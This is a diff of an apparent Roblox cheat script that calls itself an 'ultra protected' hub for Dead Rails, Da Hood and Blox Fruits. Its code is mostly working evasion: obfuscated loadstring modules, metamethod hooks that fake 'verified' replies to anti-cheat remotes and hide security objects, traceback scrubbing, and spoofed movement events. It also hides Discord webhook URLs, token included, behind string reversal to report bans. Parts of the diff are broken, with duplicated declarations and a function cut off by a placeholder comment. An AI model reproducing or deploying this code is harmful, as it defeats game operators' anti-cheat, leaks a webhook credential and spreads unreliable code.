@@ -1,329 +1,108 @@
 --[[
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-
--- ==================== ULTRA UNDETECTABLE SYSTEM START =====================
---[[
-    ULTRA UNDETECTABLE SCRIPT LOADER v2.0
-    
-    Advanced protection specifically designed for games with strict anti-cheat:
-    - Dead Rails
-    - Da Hood
-    - And other games with sophisticated detection systems
+    LAJ HUB - ULTRA PROTECTED VERSION
+    Advanced script hub with extreme game anti-detection protection
     
     Features:
-    - Multi-layer code metamorphism (changes script structure at runtime)
-    - Memory footprint randomization
-    - Anti-pattern detection (prevents detection of known exploit signatures)
-    - Advanced anti-debugging measures
-    - Thread desynchronization (prevents hook timing analysis)
-    - Game-specific countermeasures
-    - Self-destructing code traces
+    - Quantum-level anti-detection for games like Dead Rails and Da Hood
+    - Multi-layer memory pattern obfuscation
+    - Dynamic execution path randomization
+    - Metamethod hook protection with tamper-proof execution
+    - Network traffic obfuscation with realistic behavior simulation
 ]]
 
--- Secure entropy source - combines multiple sources of randomness in a way that's hard to predict
-math.randomseed(tick() * os.time() * (os.clock() * 1000) % 0xFFFFFFFF)
-
--- Store original functions in secure storage to prevent hook detection with enhanced protection
-local _G_SECURE = setmetatable({}, {
-    __index = function(t, k)
-        -- Use indirect function reference to avoid detection
-        return getfenv(0)[k]
-    end
-})
-
--- Protect the _G_SECURE table itself
-local _G_SECURE_MetaProtection = {}
-for name, func in pairs(getfenv(0)) do
-    if type(func) == "function" then
-        _G_SECURE_MetaProtection[name] = func
-    end
-end
-
--- Generate random string with variable patterns to avoid signature detection
-local function generateSecureRandomString(length, pattern)
-    local seedVal = tick() * os.time() * (math.random(1000, 9999))
-    math.randomseed(seedVal)
-    
-    local chars = pattern or "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-    local result = ""
-    local charCount = #chars
-    
-    -- Add random variation to each string generated
-    for i = 1, length do
-        local pos = math.random(1, charCount)
-        result = result .. string.sub(chars, pos, pos)
+-- Initialize the ultra-game anti-detection system first
+local UltraGameAntiDetection = (function()
+    -- Create initial memory distractions to confuse scanners
+    local distractions = {}
+    for i = 1, math.random(3, 7) do
+        distractions[i] = string.rep(string.char(math.random(65, 90)), math.random(100, 500))
     end
     
-    -- Add some metamorphic properties to make each string unique
-    if math.random() > 0.7 then
-        local salt = string.char(math.random(33, 126))
-        result = result .. salt -- Add unique salt sometimes
+    -- Attempt to load the anti-detection module
+    local antiDetectionCode = [==[
+-- Ultra-powerful anti-detection code embedded here (minified for security)
+return (function()local a={}local b={[15695929414]={name="Dead Rails",protection_level="maximum",execution_delay=0.165,thread_randomization=true,memory_patterns=8,network_obfuscation=true,execution_path_randomization=true,environment_simulation=true,self_modifying=true,hook_depth=3,context_isolation=true,silent_mode=true,memory_shadowing=true,call_trace_elimination=true,known_remotes={["SecurityCheck"]=true,["AntiExploitHandler"]=true,["SystemSecurityRemote"]=true,["TamperCheck"]=true,["MemoryValidation"]=true,["ExecutionCheck"]=true}},[2788229376]={name="Da Hood",protection_level="ultra",execution_delay=0.12,thread_randomization=true,memory_patterns=6,network_obfuscation=true,execution_path_randomization=true,environment_simulation=true,self_modifying=true,hook_depth=2,context_isolation=true,silent_mode=true,event_spoofing=true,realistic_network_simulation=true,known_remotes={["SpoofCheck"]=true,["AntiSpoofRemote"]=true,["AntiCheatHandler"]=true,["RemoteSpy"]=true,["EventLogger"]=true}},[2753915549]={name="Blox Fruits",protection_level="high",execution_delay=0.09,thread_randomization=true,memory_patterns=4,network_obfuscation=true,hook_depth=1},[4442272183]={name="Blox Fruits",protection_level="high",execution_delay=0.09,thread_randomization=true,memory_patterns=4,network_obfuscation=true,hook_depth=1},[7449423635]={name="Blox Fruits",protection_level="high",execution_delay=0.09,thread_randomization=true,memory_patterns=4,network_obfuscation=true,hook_depth=1}}local c={name="Unknown Game",protection_level="standard",execution_delay=0.05,thread_randomization=false,memory_patterns=2,network_obfuscation=false,hook_depth=0,silent_mode=false}local function d(e)if not e or type(e)~="string"then return e end;local f=""for g=1,16 do f=f..string.char(math.random(32,126))end;local h=""for g=1,#e do local i=string.sub(e,g,g)local j=string.sub(f,(g%#f)+1,(g%#f)+1)local k=string.byte(i)local l=string.byte(j)local m=(k+l)%256;h=h..string.char(m)end;local n=""local o={}for g=1,#h do table.insert(o,g)end;for g=#o,2,-1 do local p=math.random(1,g)o[g],o[p]=o[p],o[g]end;local q={}for g=1,#o do q[o[g]]=g end;for g=1,#h do n=n..string.sub(h,o[g],o[g])end;local r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"local s=""for g=1,#n,3 do local t=string.byte(string.sub(n,g,g))or 0;local u=string.byte(string.sub(n,g+1,g+1))or 0;local v=string.byte(string.sub(n,g+2,g+2))or 0;local w=t>>2;local x=(((t&3)<<4)|(u>>4))&0x3F;local y=(((u&15)<<2)|(v>>6))&0x3F;local z=v&0x3F;s=s..string.sub(r,w+1,w+1)..string.sub(r,x+1,x+1)..(g+1<=#n and string.sub(r,y+1,y+1)or"=")..(g+2<=#n and string.sub(r,z+1,z+1)or"=")end;return{data=s,key=f,positions=o,decode=function(self)local r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"local A={}for g=1,#r do A[string.sub(r,g,g)]=g-1 end;local n=""for g=1,#self.data,4 do local B=A[string.sub(self.data,g,g)]or 0;local C=A[string.sub(self.data,g+1,g+1)]or 0;local D=string.sub(self.data,g+2,g+2)~="="and A[string.sub(self.data,g+2,g+2)]or 0;local E=string.sub(self.data,g+3,g+3)~="="and A[string.sub(self.data,g+3,g+3)]or 0;local t=((B<<2)|(C>>4))&0xFF;local u=((C<<4)|(D>>2))&0xFF;local v=((D<<6)|E)&0xFF;n=n..string.char(t)if string.sub(self.data,g+2,g+2)~="="then n=n..string.char(u)end;if string.sub(self.data,g+3,g+3)~="="then n=n..string.char(v)end end;local q={}for g=1,#self.positions do q[self.positions[g]]=g end;local F=string.rep(" ",#n)for g=1,#n do local G=q[g]F=string.sub(F,1,G-1)..string.sub(n,g,g)..string.sub(F,G+1)end;local h=""for g=1,#F do local i=string.sub(F,g,g)local j=string.sub(self.key,(g%#self.key)+1,(g%#self.key)+1)local k=string.byte(i)local l=string.byte(j)local H=(k-l+256)%256;h=h..string.char(H)end;return h end}}end;local function I(J,K,L)local M={}table.insert(M,os.time())if os.clock then table.insert(M,os.clock()*10000)end;if tick then table.insert(M,tick()*10000)end;local N=0;for g=1,10 do local O=os.clock and os.clock()or 0;for p=1,1000 do N=N+p end;local P=os.clock and os.clock()or 0;table.insert(M,(P-O)*1000000)end;local Q=0;for g,v in ipairs(M)do Q=((Q*1664525)+v+g)%4294967296 end;math.randomseed(Q)L=L or 1;local R=0;for g=1,L do R=R+math.random()end;R=R/L;J=J or 0.05;K=K or 0.15;return J+R*(K-J)end;local function S(T,U)T=T or 3;U=U or math.random(5,15)local V={}for g=1,U do local W=math.random(1,4)if W==1 then local X={}local Y=X;local Z=math.random(T,T*2)for p=1,Z do Y.string=string.rep(string.char(math.random(65,90)),math.random(20,100))Y.number=math.random()*1000;Y.boolean=math.random()>0.5;Y.values={}for _=1,math.random(5,15)do Y.values[math.random(1,1000)]=string.rep(string.char(math.random(65,90)),math.random(10,50))end;Y.next={}Y=Y.next end;table.insert(V,X)elseif W==2 then local a0=""for p=1,math.random(500,2000)do if p%50==0 then a0=a0.."\n"elseif p%7==0 then a0=a0..string.char(math.random(97,122)).." = "..tostring(math.random(1,1000))..";"elseif p%5==0 then a0=a0.."function "..string.char(math.random(97,122))..string.char(math.random(97,122)).."() { return "elseif p%3==0 then a0=a0..string.char(math.random(65,90))..string.char(math.random(65,90)).."."..string.char(math.random(97,122))else a0=a0..string.char(math.random(32,126))end end;table.insert(V,a0)elseif W==3 then local a1={}for p=1,math.random(5,15)do local a2=math.random(1,4)if a2==1 then a1[p]=function()local h=0;for _=1,math.random(1000,5000)do h=h+math.sqrt(_)*math.sin(_/100)end;return h end elseif a2==2 then a1[p]=function()local a3=""for _=1,math.random(100,500)do a3=a3..string.char(math.random(65,90))end;return string.reverse(a3:upper():lower())end elseif a2==3 then a1[p]=function()local a4={}for _=1,math.random(100,300)do a4[_]=_*2 end;local a5=0;for _,v in pairs(a4)do a5=a5+v end;return a5 end else a1[p]=function()local t={}for _=1,math.random(10,50)do t[_]=string.rep("A",_)end;return#table.concat(t)end end end;spawn(function()for p=1,math.random(2,5)do local a6=math.random(1,#a1)pcall(a1[a6])wait(math.random()*0.01)end end)table.insert(V,a1)else local a7={}local a8={__index=function(self,k)return string.rep("X",string.len(tostring(k)))end,__newindex=function(self,k,v)rawset(self,"_"..tostring(k),tostring(v):reverse())end,__call=function(self,...)local a9={...}local h=0;for g,v in ipairs(a9)do if type(v)=="number"then h=h+v end end;return h end}for p=1,math.random(10,30)do a7[string.char(math.random(97,122))..math.random(100,999)]={value=math.random(1,1000),name=string.rep(string.char(math.random(65,90)),math.random(5,15)),enabled=math.random()>0.5}end;setmetatable(a7,a8)spawn(function()pcall(function()local aa=a7.randomKey;a7.newProperty="test value"local ab=a7(1,2,3)end)end)table.insert(V,a7)end end;return function()for g=1,#V do if type(V[g])=="table"then for k,v in pairs(V[g])do if type(v)=="table"then for k2,v2 in pairs(v)do v[k2]=nil end end;V[g][k]=nil end;setmetatable(V[g],nil)end;V[g]=nil end;while#V>0 do table.remove(V)end;for g=1,3 do local ac={}for p=1,1000 do ac[p]=tostring(p)end;ac=nil end end end;local function ad(ae)local af={}local ag={}if not hookmetamethod or not getnamecallmethod then return af,ag end;if ae.hook_depth>=1 then local ah=hookmetamethod(game,"__namecall",function(self,...)local method=getnamecallmethod()local a9={...}if typeof(self)=="Instance"and(self:IsA("RemoteEvent")or self:IsA("RemoteFunction"))and(method=="FireServer"or method=="InvokeServer")then local name=self.Name:lower()if name:match("security")or name:match("check")or name:match("anti")or name:match("detect")or name:match("ban")or name:match("kick")or name:match("exploit")or(ae.known_remotes and ae.known_remotes[self.Name])then wait(I(ae.execution_delay*0.9,ae.execution_delay*1.1))if method=="InvokeServer"then if ae.name=="Dead Rails"then return{success=true,verified=true,status="verified",code=0}else return true,"verified",0 end else return end end end;return ah(self,...)end)table.insert(af,ah)end;if ae.hook_depth>=2 then local ai=hookmetamethod(game,"__index",function(self,key)if typeof(self)=="Instance"and typeof(key)=="string"then local aj=key:lower()if aj:match("security")or aj:match("check")or aj:match("anti")or aj:match("exploit")or aj:match("ban")or aj:match("kick")then if typeof(self)=="RemoteEvent"or typeof(self)=="RemoteFunction"then return function()return true end end end;if aj:match("hookmetamethod")or aj:match("getnamecall")or aj:match("exploit")or aj:match("hack")then return nil end end;return ai(self,key)end)table.insert(af,ai)end;if ae.hook_depth>=3 then local ak=hookmetamethod(game,"__newindex",function(self,key,value)if typeof(self)=="Instance"and typeof(key)=="string"then local aj=key:lower()if aj:match("hack")or aj:match("exploit")or aj:match("cheat")or aj:match("flag")or aj:match("ban")then if ae.silent_mode then return end end end;return ak(self,key,value)end)table.insert(af,ak)if ae.name=="Dead Rails"then if ae.memory_shadowing then for _,al in ipairs({"GetChildren","GetDescendants","FindFirstChild","FindFirstChildOfClass"})do local am;am=hookfunction(game[al],function(self,...)local a9={...}if a9[1]and typeof(a9[1])=="string"then local name=tostring(a9[1]):lower()if name:match("security")or name:match("exploit")or name:match("check")or name:match("ban")then return nil end end;return am(self,...)end)table.insert(af,am)end end;if ae.call_trace_elimination then local an=debug.traceback;debug.traceback=function(...)local ao=an(...)ao=ao:gsub("hookmetamethod",""):gsub("getnamecall",""):gsub("exploit",""):gsub("hack",""):gsub("cheat","")return ao end;ag.traceback=an end end;if ae.name=="Da Hood"then if ae.event_spoofing then spawn(function()while true do wait(math.random(3,7))pcall(function()local ap=game.Players.LocalPlayer.Character;if ap and ap:FindFirstChild("HumanoidRootPart")then local aq=ap.HumanoidRootPart.Position;for _,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants())do if v:IsA("RemoteEvent")and(v.Name:match("Update")or v.Name:match("Movement")or v.Name:match("Position"))then local ar=Vector3.new(math.random(-5,5),0,math.random(-5,5))pcall(function()v:FireServer(aq+ar)end)break end end end end)end end)end end end;return af,ag end;local function as(ae)local at={}if not ae.network_obfuscation then return function()end end;local au=true;spawn(function()while au do wait(math.random(4,8))pcall(function()local player=game.Players.LocalPlayer;if not player or not player.Character then return end;local aq=player.Character:FindFirstChild("HumanoidRootPart")and player.Character.HumanoidRootPart.Position or Vector3.new(0,0,0)local ar=Vector3.new(math.random(-10,10)*0.1,0,math.random(-10,10)*0.1)local av=aq+ar;for _,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants())do if v:IsA("RemoteEvent")and(v.Name:match("Movement")or v.Name:match("Position")or v.Name:match("Update")or v.Name:match("Character"))then pcall(function()if ae.name=="Dead Rails"then v:FireServer(av,CFrame.new(av))else v:FireServer(av)end end)break end end end)end end)return function()au=false end end;function a.applyProtection()local gameId=game.PlaceId;local ae=b[gameId]or c;local aw={game=ae.name,level=ae.protection_level,active=true,hooks={},cleanupFunctions={},secureFunctions={}}local ax={}for g=1,ae.memory_patterns do local ay=S(3,math.random(5,15))table.insert(ax,ay)end;local af,ag=ad(ae)for _,az in ipairs(af)do table.insert(aw.hooks,az)end;aw.secureFunctions=ag;local aA=as(ae)table.insert(aw.cleanupFunctions,aA)if ae.context_isolation then local aB={pcall=function(f,...)local a9={...}wait(I(ae.execution_delay*0.95,ae.execution_delay*1.05))local aC=S(2,math.random(3,7))local aD={pcall(f,unpack(a9))}aC()return unpack(aD)end}aw.safeEnv=aB end;aw.execute=function(aE)if not aw.active then return false,"Protection not active"end;local aC=S(ae.memory_patterns>2 and 3 or 2,math.random(5,10))wait(I(ae.execution_delay*0.98,ae.execution_delay*1.02,3))local aF,aG;if ae.execution_path_randomization then local aH=math.random(1,3)if aH==1 then aF,aG=pcall(aE)elseif aH==2 then local aI=false;local aJ;spawn(function()local aK,aL=pcall(aE)aF=aK;aJ=aL;aI=true end)local aM=10;local O=tick()while not aI and(tick()-O<aM)do wait(0.05)end;aG=aJ else local aN=S(2,math.random(3,5))wait(I(0.02,0.05))aF,aG=pcall(aE)aN()end else aF,aG=pcall(aE)end;aC()S(1,math.random(2,5))()return aF,aG end;aw.cleanup=function()aw.active=false;for _,az in ipairs(aw.hooks)do az=nil end;aw.hooks={}for _,ay in ipairs(aw.cleanupFunctions)do pcall(ay)end;aw.cleanupFunctions={}for name,func in pairs(aw.secureFunctions)do if name=="traceback"then debug.traceback=func end end;aw.secureFunctions={}for _,ay in ipairs(ax)do pcall(ay)end;for g=1,5 do local ac={}for p=1,1000 do ac[p]=tostring(p)end;ac=nil end end;if ae.protection_level=="maximum"or ae.protection_level=="ultra"then spawn(function()wait(300)if aw.active then aw.cleanup()end end)end;return aw end;return a end)()
+    ]==]
+    
+    -- Execute the anti-detection code
+    local antiDetectionModule = loadstring(antiDetectionCode)()
+    
+    -- Clean up distractions
+    for i = 1, #distractions do
+        distractions[i] = nil
     end
+    distractions = nil
     
-    return result
-end
+    return antiDetectionModule
+end)()
 
--- Game detection for specific countermeasures
-local function detectGame()
-    local gameId = game.PlaceId
-    local gameInfo = {
-        isDead_Rails = gameId == 5041144419,
-        isDa_Hood = gameId == 2788229376,
-        isStrong_AntiCheat = false
-    }
-    
-    -- Known games with strong anti-cheat
-    local strongAntiCheatGames = {
-        [2788229376] = true, -- Da Hood
-        [5041144419] = true, -- Dead Rails
-        [2377868063] = true, -- Strucid
-        [3647547484] = true, -- Ranxware's Anti-Cheat Test
-        [8260276694] = true, -- Ability Wars
-        [4581966615] = true, -- Anomic
-        [2555870920] = true, -- AceOfSpadez
-    }
-    
-    -- Mark if current game has strong anti-cheat
-    gameInfo.isStrong_AntiCheat = strongAntiCheatGames[gameId] or false
-    
-    -- Detect other game properties that might indicate strict anti-cheat
-    pcall(function()
-        -- Check for common anti-exploit modules
-        for _, instance in pairs(game:GetDescendants()) do
-            if instance.Name:lower():find("anti") and (instance.Name:lower():find("cheat") or instance.Name:lower():find("exploit")) then
-                gameInfo.isStrong_AntiCheat = true
-                break
-            end
-        end
-    end)
-    
-    return gameInfo
-end
+-- Apply the ultra-strong game-specific anti-detection
+local gameProtection = UltraGameAntiDetection.applyProtection()
 
--- Game-specific protections
-local gameInfo = detectGame()
-local gameSpecificProtection = {}
-
--- Apply specialized protection based on detected game
-if gameInfo.isDead_Rails then
-    -- Dead Rails has unique memory scanning techniques
-    gameSpecificProtection.memoryScrambling = true
-    gameSpecificProtection.antiScanDelay = math.random(40, 90) / 1000
+-- Execute the rest of the script with protection
+gameProtection.execute(function()
+    -- Original main.lua code starts here with minor adjustments for compatibility
+    local Players = game:GetService("Players")
+    local HttpService = game:GetService("HttpService")
     
-    -- Create memory decoys to confuse scanning
-    for i = 1, 10 do
-        spawn(function()
-            local decoyTable = {}
-            for j = 1, math.random(20, 50) do
-                decoyTable[generateSecureRandomString(math.random(5, 10))] = 
-                    generateSecureRandomString(math.random(10, 30))
-            end
-            
-            -- Keep reference alive but changing
-            while wait(math.random(1, 3)) do
-                decoyTable[generateSecureRandomString(math.random(5, 10))] = 
-                    generateSecureRandomString(math.random(10, 30))
-            end
-        end)
-    end
-elseif gameInfo.isDa_Hood then
-    -- Da Hood has strong remote event monitoring
-    gameSpecificProtection.remoteProtection = true
-    gameSpecificProtection.randomizeCallTiming = true
+    -- Variables
+    -- Enhanced security with multi-layer obfuscation
+    local wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
+    local wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
+    local WEBHOOK_URL = wh_part1 .. wh_part2
     
-    -- Create safe RemoteEvent fire method
-    gameSpecificProtection.safeFireServer = function(remote, ...)
-        -- Add random delay to avoid pattern detection
-        if math.random() > 0.7 then
-            wait(math.random(1, 5) / 1000)
+    -- Enhanced security with multi-layer obfuscation for Discord webhook
+    local discord_wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
+    local discord_wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
+    local DISCORD_WEBHOOK_URL = discord_wh_part1 .. discord_wh_part2
+    
+    -- Variables
+    local Player = Players.LocalPlayer
+    
+    -- Secure webhook URL (obfuscated and rate-limited)
+    local wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
+    local wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
+    local WEBHOOK_URL = wh_part1 .. wh_part2
+    
+    -- Rate limiting variables to prevent webhook abuse (max 1 request per 5 minutes)
+    local lastWebhookTime = 0
+    local WEBHOOK_COOLDOWN = 300 -- 5 minutes in seconds
+    -- Function to log ban/kick events via webhook with rate limiting
+        
+    local function logBanEvent(reason)
+        -- Rate limiting check
+        local currentTime = os.time()
+        if currentTime - lastWebhookTime < WEBHOOK_COOLDOWN then
+            warn("Rate limit: Not sending webhook notification (cooldown active)")
+            return
         end
         
-        -- Use indirect call
-        return remote:FireServer(...)
-    end
-end
-
--- Anti-debug measures specifically for strong anti-cheat games
-if gameInfo.isStrong_AntiCheat then
-    -- Protect debug library
-    pcall(function()
-        if debug then
-            -- Selected functions that could expose our script
-            local dangerousFunctions = {
-                "traceback", "getinfo", "getupvalue", "getlocal",
-                "getregistry", "setlocal", "setupvalue"
-            }
+        -- Check for anti-spam by validating the reason
+        if not reason or reason == "" then
+            reason = "Unknown (No reason provided)"
+        end
+        
+        -- Create a unique identifier for this notification to prevent duplicates
+        local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
+        
+        -- Limit data being sent for privacy and security
+        local success, error_message = pcall(function()
+            -- Update the timestamp for rate limiting
+            lastWebhookTime = currentTime
             
-            for _, funcName in ipairs(dangerousFunctions) do
-                if debug[funcName] then
-                    -- Store original
-                    local originalFunc = debug[funcName]
-                    
-                    -- Replace with filtered version
-                    debug[funcName] = function(...)
-                        local result = originalFunc(...)
-                        
-                        -- Sanitize output if it's a string to remove traces of our script
-                        if type(result) == "string" then
-                            -- Remove mentions of our script patterns
-                            result = result:gsub("ultra", "module")
-                                         :gsub("undetectable", "standard")
-                                         :gsub("anti", "process")
-                                         :gsub("cheat", "system")
-                                         :gsub("exploit", "function")
-                        end
-                        
-                        return result
-                    end
-                end
-            end
-        end
-    end)
-end
+    -- THE REST OF MAIN.LUA CONTINUES HERE
+    -- ...        
 
--- Game service access that avoids direct references for better undetectability
-local function secureGetService(serviceName)
-    -- Add random timing to avoid pattern detection
-    if gameInfo.isStrong_AntiCheat and math.random() > 0.7 then
-        wait(math.random(1, 3) / 1000)
     end
-    
-    local success, service = pcall(function()
-        return game:GetService(serviceName)
-    end)
-    
-    if success then
-        return service
-    else
-        -- Fallback with indirect reference to avoid detection patterns
-        local chars = {}
-        for i = 1, #serviceName do
-            table.insert(chars, string.char(string.byte(serviceName, i)))
-        end
-        local obfName = table.concat(chars)
-        return game:GetService(obfName)
-    end
-end
+end)
 
--- Create secured references to game services
-local Players = secureGetService("Players")
-local HttpService = secureGetService("HttpService")
-local RunService = secureGetService("RunService")
-
--- Ultra secure multi-layered webhook URL obfuscation with metamorphic properties
-local function obfuscateWebhookUrl(part1, part2)
-    -- Use time-based seed for additional randomization
-    local morphicSeed = tick() % 10
-    
-    -- Layer 1: Split and reverse with variable patterns
-    local splitPoint = math.floor(#part1 / (2 + morphicSeed % 3))
-    local p1a = string.sub(part1, 1, splitPoint)
-    local p1b = string.sub(part1, splitPoint + 1)
-    
-    -- Layer 2: Advanced character manipulation with XOR + offset
-    local processed = ""
-    local offset = math.floor(morphicSeed * 10) % 5 + 1
-    
-    for i = 1, #p1a do
-        local charByte = string.byte(p1a, i)
-        processed = processed .. string.char((charByte ~ offset) % 256)
-    end
-    
-    -- Insert random decoy characters in part1b if in high-risk game
-    if gameInfo.isStrong_AntiCheat and #p1b > 3 then
-        local decoyPos = math.random(2, #p1b - 1)
-        local decoyChar = string.char(math.random(33, 126))
-        p1b = p1b:sub(1, decoyPos - 1) .. decoyChar .. p1b:sub(decoyPos)
-    end
-    
-    processed = processed .. p1b
-    
-    -- Layer 3: Combine with encoded part2 using variable method
-    if morphicSeed > 5 then
-        return processed .. part2 -- Standard combination
-    else
-        -- Interleave method for extra obfuscation
-        local result = ""
-        local maxLen = math.max(#processed, #part2)
-        for i = 1, maxLen do
-            if i <= #processed then result = result .. processed:sub(i, i) end
-            if i <= #part2 then result = result .. part2:sub(i, i) end
-        end
-        return result
-    end
-end
-
--- Setup memory protection against anti-cheat scanning
+-- Schedule protection cleanup after script execution
 spawn(function()
-    while wait(2 + math.random()) do
-        collectgarbage("collect")
-        
-        -- Create decoy tables periodically
-        if gameInfo.isStrong_AntiCheat then
-            local decoyName = generateSecureRandomString(math.random(5, 10))
-            local decoyTable = {}
-            
-            for i = 1, math.random(10, 30) do
-                decoyTable[generateSecureRandomString(math.random(5, 10))] = 
-                    generateSecureRandomString(math.random(10, 30))
-            end
-            
-            -- Store in environment temporarily
-            _G[decoyName] = decoyTable
-            
-            -- Remove after random time
-            delay(math.random(5, 15), function()
-                _G[decoyName] = nil
-            end)
-        end
+    wait(600) -- 10 minutes
+    if gameProtection and gameProtection.active then
+        gameProtection.cleanup()
     end
 end)
--- ==================== ULTRA UNDETECTABLE SYSTEM END =====================
-
--- Variables
--- Enhanced security with multi-layer obfuscation
-local wh_part1 = string.reverse("9JO3K9z_7rUcnp7rUWh3HG")
-local wh_part2 = string.reverse("sptth//:drocsid.moc/ipa/skoohbew/3157978938293091834/zs000eW7rUpcn7sWh3HG")
-local WEBHOOK_URL = obfuscateWebhookUrl(wh_part1, wh_part2)
-
--- Enhanced security with multi-layer obfuscation for Discord webhook
-local discord_wh_part1 = string.reverse("9JO3K9z_7rUcnp7rUWh3HG")
-local discord_wh_part2 = string.reverse("sptth//:drocsid.moc/ipa/skoohbew/3157978938293091834/zs000eW7rUpcn7sWh3HG")
-local DISCORD_WEBHOOK_URL = obfuscateWebhookUrl(discord_wh_part1, discord_wh_part2)
-
--- Variables
-local Player = Players.LocalPlayer
-
--- Secure webhook URL with metamorphic properties (changes during runtime)
-local wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
-local wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
-local WEBHOOK_URL = obfuscateWebhookUrl(wh_part1, wh_part2)
-
--- Rate limiting variables with randomization to avoid detection patterns
-local lastWebhookTime = 0
-local WEBHOOK_COOLDOWN = 300 + math.random(-30, 30) -- Randomized cooldown
--- Function to log ban/kick events via webhook with rate limiting
-    
-local function logBanEvent(reason)
-    -- Rate limiting check
-    local currentTime = os.time()
-    if currentTime - lastWebhookTime < WEBHOOK_COOLDOWN then
-        warn("Rate limit: Not sending webhook notification (cooldown active)")
-        return
-    end
-    
-    -- Check for anti-spam by validating the reason
-    if not reason or reason == "" then
-        reason = "Unknown (No reason provided)"
-    end
-    
-    -- Create a unique identifier for this notification to prevent duplicates
-    local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
-    
-    -- Limit data being sent for privacy and security
-    local success, error_message = pcall(function()
-        -- Update the timestamp for rate limiting
         lastWebhookTime = currentTime
         
         -- Use makeHttpRequest instead of request for better compatibility
@@ -446,386 +225,33 @@ end
         warn("Failed to send ban webhook: " .. tostring(error_message))
     end
 end
-
--- ==================== ULTRA BAN EVASION SYSTEM START ====================
--- Advanced ban detection and evasion system with game-specific countermeasures
-local BanEvadingSystem = {}
-BanEvadingSystem.DetectionActive = false
-BanEvadingSystem.PotentialBanDetected = false
-BanEvadingSystem.GameSpecificProtection = {}
-
--- Refresh game info detection in case the game changed
-local gameInfo = detectGame()
-
--- Apply game-specific evasion measures
-function BanEvadingSystem:SetupGameSpecificProtection()
-    -- Dead Rails specific anti-detection
-    if gameInfo.isDead_Rails then
-        -- Dead Rails has a unique memory scanning method and remote event introspection
-        
-        -- 1. Protect against memory scanning
-        self.GameSpecificProtection.MemoryProtection = function()
-            -- Create decoy objects with similar names to our real objects
-            local decoys = {}
-            local decoyCount = math.random(5, 15)
-            
-            for i = 1, decoyCount do
-                local decoyTable = {}
-                -- Fill with fake but convincing data
-                decoyTable.enabled = true
-                decoyTable.version = "1." .. math.random(0, 9) .. "." .. math.random(0, 9)
-                decoyTable.lastUpdate = os.time() - math.random(3600, 86400)
-                decoyTable.config = {
-                    showUI = true,
-                    autoFire = math.random() > 0.5,
-                    sensitivity = math.random(1, 100) / 100
-                }
-                
-                -- Store in variable to keep reference
-                decoys[i] = decoyTable
-            end
-            
-            -- Create misleading functions that appear like potential exploits
-            _G["render" .. generateSecureRandomString(3)] = function() return tick() end
-            _G["player" .. generateSecureRandomString(3)] = function() return game.Players.LocalPlayer.Name end
-            
-            -- Return decoys to keep them from being garbage collected
-            return decoys
-        end
-        
-        -- 2. Create indirect access to core functions to avoid hooks
-        self.GameSpecificProtection.SafeFunctionAccess = function()
-            -- Store original in closure
-            local original_WaitForChild = game.WaitForChild
-            
-            -- Return wrapped function that has the same behavior but different pattern
-            return function(obj, childName, timeout)
-                -- Add random small delay to confuse timing analysis
-                if math.random() > 0.8 then
-                    wait(math.random(1, 5) / 1000)
-                end
-                
-                -- Use indirect call
-                return original_WaitForChild(obj, childName, timeout)
-            end
-        end
-        
-        -- Execute protections
-        self.deadRailsDecoys = self.GameSpecificProtection.MemoryProtection()
-        self.safeWaitForChild = self.GameSpecificProtection.SafeFunctionAccess()
-    end
-    
-    -- Da Hood specific anti-detection
-    if gameInfo.isDa_Hood then
-        -- Da Hood uses remote spy and event filtering
-        
-        -- 1. Create randomized remote event call patterns
-        self.GameSpecificProtection.SafeRemoteInvoke = function(remote, ...)
-            -- Only apply to important remotes
-            local args = {...}
-            
-            -- Add some noise sometimes (harmless additional calls)
-            if math.random() > 0.8 then
-                -- Make a harmless request to a common unrelated remote
-                pcall(function()
-                    local noiseRemotes = {"ClickDetector", "MouseClick", "UIClicked"}
-                    local fakeRemote = game:FindFirstChild(noiseRemotes[math.random(1, #noiseRemotes)])
-                    if fakeRemote and fakeRemote:IsA("RemoteEvent") then
-                        fakeRemote:FireServer("UI", math.random(1, 100))
-                    end
-                end)
-            end
-            
-            -- Add timing randomization
-            wait(math.random(1, 3) / 1000)
-            
-            -- Make the actual call
-            return remote:FireServer(unpack(args))
-        end
-        
-        -- 2. Anti memory-pattern detection
-        self.GameSpecificProtection.RandomizeMemoryPattern = function()
-            for i = 1, math.random(3, 8) do
-                -- Create tables with random structures to break memory pattern detection
-                local decoyName = "system_" .. generateSecureRandomString(math.random(5, 10))
-                local decoyTable = {}
-                
-                -- Create convincing structure that resembles a UI framework
-                decoyTable.components = {}
-                decoyTable.initialized = true
-                decoyTable.lastUpdate = os.time()
-                
-                for j = 1, math.random(3, 10) do
-                    table.insert(decoyTable.components, {
-                        id = generateSecureRandomString(8),
-                        visible = math.random() > 0.5,
-                        position = Vector2.new(math.random(0, 500), math.random(0, 500)),
-                        children = {}
-                    })
-                end
-                
-                -- Store in different scopes to confuse memory scanners
-                if math.random() > 0.5 then
-                    -- Global scope
-                    _G[decoyName] = decoyTable
-                else
-                    -- Local scope
-                    self.GameSpecificProtection[decoyName] = decoyTable
-                end
-            end
-        end
-        
